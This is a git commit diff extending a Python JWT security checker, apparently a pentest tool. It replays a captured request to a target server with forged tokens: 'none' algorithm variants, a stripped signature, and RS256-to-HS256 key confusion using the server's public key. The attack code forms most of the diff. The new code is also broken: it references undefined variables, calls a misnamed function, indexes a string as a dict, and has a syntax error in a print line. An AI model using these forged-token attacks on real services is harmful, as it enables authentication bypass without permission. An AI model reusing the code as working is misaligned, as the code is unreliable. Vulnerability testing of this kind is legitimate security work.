9364327bc9fad1843a93536bc12384e1edc811e4
asantof <114263468+asantof@users.noreply.github.com>
2023-03-28 19:19:57 -0400

    updates

--- JWT_security_check.py
+++ JWT_security_check.py
@@ -1,10 +1,11 @@
 #!/usr/bin/python3
 
 # Assuming the JWT token is in the Authorization header and it is currently valid (not expired).
-
+# Have in mind the program works by comparing a request with the original JWT and replacing it with others to make some tests.
 # None algorithm with none, None, NONE, nOnE
 # Lack of a valid signature, keep the algorithm, just remove the signature
-# Key confusion, the program asks if you want to try it and then asks for the public key
+# Key confusion, the program asks if you want to try it and then asks for the public key. Servers sometimes expose their public keys as JSON Web Key (JWK) objects via a standard endpoint mapped to /jwks.json or /.well-known/jwks.json 
+# you must provide the public key in .pem format
 
 # Takes a request as a parameter with -r 
 
@@ -94,6 +95,8 @@ def test_none(method, protocol, host, path, headers_dict, data, jwt_token):
 		new_jwt = new_header + "." + payload + "."
 		headers_dict['Authorization'] = 'Bearer ' + new_jwt
 		response2 = requests.request(method, url, headers=headers_dict, params=data)
+		
+		# Compare responses
 		if response1.content == response2.content:
 		    print('\033[91m' + '[!]' + '\033[0m' + ' Potentially vulnerable to NONE ALGORITHM VULNERABILITY.')
 		    print('--> A successful attempt was made by setting the algorithm to ' + none + '. The following JWT was used as payload: ' + new_jwt)
@@ -101,41 +104,97 @@ def test_none(method, protocol, host, path, headers_dict, data, jwt_token):
 	print('[*] The application does not seem to be vulnerable to JWT None Algorithm Vulnerability.')
 	return
 	
-#def test_lack_signature():
+def test_lack_signature(method, protocol, host, path, headers_dict, data, jwt_token):
+	url = protocol+ "://" + host + path
+	response1 = requests.request(method, url, headers=headers_dict, params=data)
+	
+	# Split and decode header
+	header, payload, signature = jwt_token.split(".")
 
-#def test_key_confusion():
+	# Build new token
+	new_jwt = header + "." + payload + "."
+	headers_dict['Authorization'] = 'Bearer ' + new_jwt
+	response2 = requests.request(method, url, headers=headers_dict, params=data)
+	
+	# Compare responses
+	if response1.content == response2.content:
+	    print('\033[91m' + '[!]' + '\033[0m' + ' Potentially vulnerable to LACK OF SIGNATURE VERIFICATION.')
+	    print('--> A successful attempt was made by setting the algorithm to ' + none + '. The following JWT was used as payload: ' + new_jwt)
+	    return
+	    
+	print('[*] The application does not seem to be vulnerable to JWT Lack of Signature Vulnerability.')
+	return
+
+def test_key_confusion(method, protocol, host, path, headers_dict, data, jwt_token, key_file):
 	# 
+	if header_dict['alg'] == 'RS256':
+		url = protocol+ "://" + host + path
+		response1 = requests.request(method, url, headers=headers_dict, params=data)
+		
+		# Split and decode header
+		header, payload, signature = jwt_token.split(".")
+		
+		# Set the algorithm to HS256
+		header['alg'] = 'HS256'
+		payload = jwt.decode(jwt_token, verify=False)
+		
+		# Get the secret key from the supplied file
+		with open(key_file, 'r') as f:
+			secret_key = f.read()
+		
+		# Build new JWT
+		encoded_payload = jwt.encode(payload, key=secret_key, algorithm='HS256')
+		new_token = header.decode('utf-8').strip() + '.' + encoded_payload.decode('utf-8').strip() + '.'
+		new_jwt = header + "." + payload + "."
+		headers_dict['Authorization'] = 'Bearer ' + new_jwt
+		
+		# Send new request
+		response2 = requests.request(method, url, headers=headers_dict, params=data)
+		if response1.content == response2.content:
+		    print('\033[91m' + '[!]' + '\033[0m' + ' Potentially vulnerable to KEY CONFUSION.')
+		    print('--> A successful attempt was made by setting the algorithm to HS256 and using the supplied key. The following JWT was used as payload: ' + new_jwt)
+		    return
+		print('[*] The application does not seem to be vulnerable to KEY CONFUSION.')
+		return
+	else:
+		return
+	
 
 def main(argv):
 	requestfile = ''
+	publickeyfile = ''
 	protocol = "https";
 	try:
-		opts, args = getopt.getopt(argv,"r:p:",["rfile=", "protocol="])
+		opts, args = getopt.getopt(argv,"r:p:k:",["rfile=", "protocol=", "key="])
 	except getopt.GetoptError:
-		print ('python3 JWT_security_check.py -r <requestfile> [-p <https|http>]')
+		print ('python3 JWT_security_check.py -r <request file> [-p <https|http>] [-k <public key file>]'')
 		sys.exit(2)
 	for opt, arg in opts:
 		if opt == '-h':
-			print ('Usage: python3 JWT_security_check.py -r <requestfile> [-p <https|http>]')
+			print ('Usage: python3 JWT_security_check.py -r <requestfile> [-p <https|http>] [-k <public key file>]')
 			sys.exit()
 		elif opt in ("-r", "--rfile"):
 			requestfile = arg
+		elif opt in ("-k", "--key"):
+			publickeyfile = arg
 		elif opt in ("-p", "--protocol"):
 			if arg.lower() == "http" or arg.lower() == "https":
 				protocol = arg.lower()
 			else:
 				print("Invalid protocol, defaulting to HTTPS.");
 	method, path, headers, data = process_file(requestfile)
+	
 	# Not very efficient to go over the headers twice but it makes the code easier to understand
 	jwt_token = get_jwt_token(headers)
 	host = get_host(headers)
 	headers_dict = {}
+	
 	for header in headers:
 		key, value = header.split(': ')
 		headers_dict[key] = value
 	test_none(method, protocol, host, path, headers_dict, data, jwt_token)
-	#testLackSignature()
-	#testKeyConfusion()
+	testLackSignature(method, protocol, host, path, headers_dict, data, jwt_token)
+	#testKeyConfusion(method, protocol, host, path, headers_dict, data, jwt_token, publickeyfile)
 	
 
 
